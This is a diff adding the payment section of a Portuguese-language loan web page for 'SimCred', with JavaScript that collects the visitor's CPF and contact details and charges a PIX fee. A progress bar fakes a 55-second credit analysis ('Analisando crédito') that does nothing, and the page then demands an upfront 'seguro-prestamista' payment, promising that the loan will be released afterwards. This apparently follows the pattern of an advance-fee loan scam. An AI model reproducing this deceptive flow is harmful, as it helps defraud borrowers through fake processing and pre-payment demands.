+          <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg>
+        </div>
+        <h3>Pagamento confirmado!</h3>
+        <p>Seu crédito de <strong id="pixSuccessAmount">R$ 0,00</strong> será liberado automaticamente via PIX em instantes.</p>
+      </div>
+
+      <!-- Expired State -->
+      <div class="pix-expired" id="pixExpired">
+        <div class="pix-expired-icon">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+        </div>
+        <h3>Código expirado</h3>
+        <p>O tempo para pagamento expirou. Gere um novo código para continuar.</p>
+        <button class="pix-retry-btn" onclick="retryPayment()">Gerar Novo Código</button>
+      </div>
+    </div>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-logo"><img src="/images/Sim-Cred.png" alt="SimCred" style="height:36px;width:auto;object-fit:contain;display:block;filter:brightness(1.1);"></div>
+      <small><strong>SimCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85</small>
+    </div>
+  </footer>
+
+  <script>
+    function loadUserData() {
+      const nome = localStorage.getItem('nome');
+      if (nome) {
+        const nomes = nome.trim().split(' ');
+        const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
+        document.getElementById('userName').textContent = ultimoNome ? `${nomes[0]} ${ultimoNome}` : nomes[0];
+      }
+      
+      const cpf = localStorage.getItem('cpf');
+      if (cpf) {
+        const cpfLimpo = cpf.replace(/\D/g, '');
+        if (cpfLimpo.length === 11) {
+          document.getElementById('userCpf').textContent = `${cpfLimpo.substring(0, 3)}.***.***-${cpfLimpo.substring(9, 11)}`;
+        }
+      }
+
+      let approvedAmount = localStorage.getItem('selectedLoanAmount');
+      let installments = localStorage.getItem('selectedInstallments');
+      let monthlyPayment = localStorage.getItem('selectedMonthlyPayment');
+
+      if (approvedAmount) {
+        const amount = parseFloat(approvedAmount);
+        document.getElementById('approvedAmount').textContent = amount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      }
+
+      if (installments && monthlyPayment) {
+        const monthly = parseFloat(monthlyPayment);
+        document.getElementById('installmentsText').textContent = `${installments}x de ${monthly.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
+      } else if (installments && approvedAmount) {
+        const amount = parseFloat(approvedAmount);
+        const months = parseInt(installments);
+        const monthlyRate = 0.0081;
+        const monthly = (amount * (monthlyRate * Math.pow(1 + monthlyRate, months))) / (Math.pow(1 + monthlyRate, months) - 1);
+        document.getElementById('installmentsText').textContent = `${months}x de ${monthly.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
+      }
+    }
+
+    function startProgress() {
+      const progressBar = document.getElementById('progressBar');
+      const progressPercent = document.getElementById('progressPercent');
+      const progressStatus = document.getElementById('progressStatus');
+      const progressSection = document.getElementById('progressSection');
+      const ctaButton = document.getElementById('ctaButton');
+
+      const statusMessages = [
+        { percent: 0, text: 'Processando' },
+        { percent: 20, text: 'Verificando dados' },
+        { percent: 40, text: 'Analisando crédito' },
+        { percent: 60, text: 'Calculando taxas' },
+        { percent: 80, text: 'Finalizando' },
+        { percent: 100, text: 'Concluído!' }
+      ];
+
+      let currentPercent = 0;
+      const totalDuration = 55000; // 55 segundos
+      const intervalTime = 200; // atualiza a cada 200ms
+      const increment = 100 / (totalDuration / intervalTime);
+
+      const progressInterval = setInterval(() => {
+        currentPercent += increment;
+        
+        if (currentPercent >= 100) {
+          currentPercent = 100;
+          clearInterval(progressInterval);
+          
+          // Atualizar para estado completo
+          progressBar.style.width = '100%';
+          progressPercent.textContent = '100% concluído';
+          progressStatus.textContent = 'Concluído!';
+          progressSection.classList.add('completed');
+
+          // Mostrar botão e rolar até ele
+          setTimeout(() => {
+            ctaButton.classList.remove('hidden');
+            ctaButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          }, 500);
+          
+          return;
+        }
+
+        // Atualizar barra e porcentagem
+        progressBar.style.width = currentPercent + '%';
+        progressPercent.textContent = Math.floor(currentPercent) + '% concluído';
+
+        // Atualizar mensagem de status
+        for (let i = statusMessages.length - 1; i >= 0; i--) {
+          if (currentPercent >= statusMessages[i].percent) {
+            progressStatus.textContent = statusMessages[i].text;
+            break;
+          }
+        }
+      }, intervalTime);
+    }
+
+    // ═══════════════════════════════════════════════
+    //  PIX PAYMENT FLOW
+    // ═══════════════════════════════════════════════
+    let currentChargeId = null;
+    let pollingInterval = null;
+    let timerInterval = null;
+
+    const CTA_ORIGINAL = document.getElementById('ctaButton').innerHTML;
+
+    async function handleCTA() {
+      const btn = document.getElementById('ctaButton');
+      btn.innerHTML = '<div class="spinner"></div><span>Gerando código PIX...</span>';
+      btn.disabled = true;
+
+      // Meta Pixel — InitiateCheckout
+      if (typeof fbq === 'function') {
+        try { fbq('track', 'InitiateCheckout'); } catch(e) {}
+      }
+
+      try {
+        const nome = localStorage.getItem('nome') || 'Cliente';
+        const cpf  = localStorage.getItem('cpf') || '';
+
+        const response = await fetch('/api/public/payments/create', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            sku: 'seguro-prestamista',
+            quantity: 1,
+            payer: {
+              name: nome,
+              document: cpf.replace(/\D/g, '')
+            },
+            metadata: {
+              email: localStorage.getItem('email') || '',
+              phone: localStorage.getItem('telefone') || ''
+            }
+          })
+        });
+
+        const data = await response.json();
+
+        if (!data.success) {
+          throw new Error(data.error || 'Erro ao criar cobrança');
+        }
+
+        currentChargeId = data.charge.id;
+        showPixModal(data.charge);
+      } catch (err) {
+        console.error('Payment error:', err);
+        alert('Erro ao gerar código PIX. Tente novamente.');
+        btn.innerHTML = CTA_ORIGINAL;
+        btn.disabled = false;
+      }
+    }
+
+    function showPixModal(charge) {
+      const overlay = document.getElementById('pixOverlay');
+      overlay.classList.add('show');
+      document.getElementById('pixPending').style.display = 'block';
+      document.getElementById('pixSuccess').style.display = 'none';
+      document.getElementById('pixExpired').style.display = 'none';
+
+      // Amount badge
+      const amt = charge.amount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      document.getElementById('pixAmountBadge').textContent = amt;
+
+      // Generate QR Code
+      const qrContainer = document.getElementById('pixQrCode');
+      qrContainer.innerHTML = '';
+      if (typeof QRCode !== 'undefined') {
+        new QRCode(qrContainer, {
+          text: charge.pix_code,
+          width: 200,
+          height: 200,
+          colorDark: '#042444',
+          colorLight: '#ffffff',
+          correctLevel: QRCode.CorrectLevel.M
+        });
+      }
+
+      // Set PIX code text
+      document.getElementById('pixCodeText').value = charge.pix_code;
+
+      // Start expiration timer
+      const expiresAt = charge.expires_at || new Date(Date.now() + 3600000).toISOString();
+      startTimer(expiresAt);
+
+      // Start polling for payment status
+      startPolling();
+    }
+
+    function startTimer(expiresAt) {
+      if (timerInterval) clearInterval(timerInterval);
+      const expiry = new Date(expiresAt).getTime();
+
+      function tick() {
+        const remaining = expiry - Date.now();
+        if (remaining <= 0) {
+          clearInterval(timerInterval);
+          stopPolling();
+          showExpired();
+          return;
+        }
+        const m = Math.floor(remaining / 60000);
+        const s = Math.floor((remaining % 60000) / 1000);
+        document.getElementById('pixTimer').textContent =
+          String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+      }
+
+      tick();
+      timerInterval = setInterval(tick, 1000);
+    }
+
+    function startPolling() {
+      if (pollingInterval) clearInterval(pollingInterval);
+
+      pollingInterval = setInterval(async () => {
+        if (!currentChargeId) return;
+        try {
+          const res = await fetch('/api/public/payments/status/' + currentChargeId);
+          const data = await res.json();
+
+          if (data.status === 'PAID') {
+            stopPolling();
+            if (timerInterval) clearInterval(timerInterval);
+            await handlePaymentConfirmed(data);
+          } else if (data.status === 'EXPIRED' || data.status === 'CANCELLED') {
+            stopPolling();
+            if (timerInterval) clearInterval(timerInterval);
+            showExpired();
+          }
+        } catch (e) {
+          console.error('Polling error:', e);
+        }
+      }, 5000);
+    }
+
+    function stopPolling() {
+      if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
+    }
+
+    async function handlePaymentConfirmed(chargeData) {
+      // Show success UI
+      document.getElementById('pixPending').style.display = 'none';
+      document.getElementById('pixSuccess').style.display = 'flex';
+
+      // Show approved loan amount
+      const loanAmount = parseFloat(localStorage.getItem('selectedLoanAmount')) || 0;
+      document.getElementById('pixSuccessAmount').textContent =
+        loanAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+      try {
+        // Get Meta cookies
+        const fbp = getCookie('_fbp') || '';
+        const fbc = getCookie('_fbc') || '';
+
+        const res = await fetch('/api/public/payments/purchase-event', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            id: currentChargeId,
+            fbp: fbp,
+            fbc: fbc,
+            url: window.location.href
+          })
+        });
+
+        const data = await res.json();
+
+        // Meta Pixel — Purchase (browser-side, deduped with CAPI via event_id)
+        if (data.paid && typeof fbq === 'function') {
+          try {
+            fbq('track', 'Purchase', {
+              value: data.value,
+              currency: data.currency || 'BRL'
+            }, { eventID: data.event_id });
+          } catch(e) {}
+        }
+      } catch (e) {
+        console.error('Purchase event error:', e);
+      }
+    }
+
+    function showExpired() {
+      document.getElementById('pixPending').style.display = 'none';
+      document.getElementById('pixExpired').style.display = 'flex';
+    }
+
+    function copyPixCode() {
+      const input = document.getElementById('pixCodeText');
+      input.select();
+      input.setSelectionRange(0, 99999);
+
+      try {
+        navigator.clipboard.writeText(input.value);
+      } catch(e) {
+        document.execCommand('copy');
+      }
+
+      const btn = document.getElementById('pixCopyBtn');
+      btn.textContent = 'Copiado!';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = 'Copiar';
+        btn.classList.remove('copied');
+      }, 2500);
+    }
+
+    function closePixModal() {
+      document.getElementById('pixOverlay').classList.remove('show');
+      stopPolling();
+      if (timerInterval) clearInterval(timerInterval);
+
+      // Reset CTA button
+      const btn = document.getElementById('ctaButton');
+      btn.innerHTML = CTA_ORIGINAL;
+      btn.disabled = false;
+    }
+
+    function retryPayment() {
+      document.getElementById('pixExpired').style.display = 'none';
+      closePixModal();
+      setTimeout(() => handleCTA(), 300);
+    }
+
+    function getCookie(name) {
+      const v = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
+      return v ? v.pop() : '';
+    }
+
+    // Close PIX modal on overlay click
+    document.getElementById('pixOverlay').addEventListener('click', function(e) {
+      if (e.target === this) closePixModal();
+    });
+
+    document.addEventListener('DOMContentLoaded', () => {
+      loadUserData();
+    });
+  </script>
+
+</body></html>
